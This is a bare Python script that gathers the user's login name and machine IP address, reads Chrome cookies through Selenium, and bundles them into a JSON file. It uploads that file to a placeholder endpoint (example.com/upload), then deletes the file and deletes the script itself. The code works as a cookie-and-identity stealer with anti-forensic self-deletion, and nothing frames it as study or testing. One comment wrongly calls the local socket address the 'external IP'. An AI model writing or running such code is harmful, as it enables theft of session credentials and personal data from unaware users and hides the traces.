from selenium import webdriver
import os
import socket
import json
import time
import requests

# Get the current user's username
username = os.getlogin()

# Get the computer's external IP address
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
ip = s.getsockname()[0]

# Create a Chrome WebDriver instace
driver = webdriver.Chrome()

# Open a website (e.g., 'https://www.example.com')
driver.get('https://www.google.com')

# Get all cookies from the current website
cookies = driver.get_cookies()

# Close the WebDriver
driver.quit()

cookies_with_metadata = {
    "username": username,
    "ip": ip,
    "cookies": cookies
}

file_path = 'chrome_cookies_with_metadata.json'
# Write the cookies with metadata to a file
with open(file_path, 'w') as f:
    json.dump(cookies_with_metadata, f, indent=2)

# Send the file via URL
url = 'https://example.com/upload'
files = {'file': open(file_path, 'rb')}
response = requests.post(url, files=files)

# Check if the file was successfully uploaded
if response.status_code == 200:
    print("File uploaded successfully!")
    # Delete the file after sending
    os.remove(file_path)
    print("File deleted successfully!")
else:
    print("Failed to upload the file.")

# Self-delete the script file (THIS WILL DELETE THE SCRIPT REGARDLESS IF IT SENT THE FILE OR NOT)
script_path = os.path.abspath(__file__)
os.remove(script_path)
print("Script self-deleted successfully!")
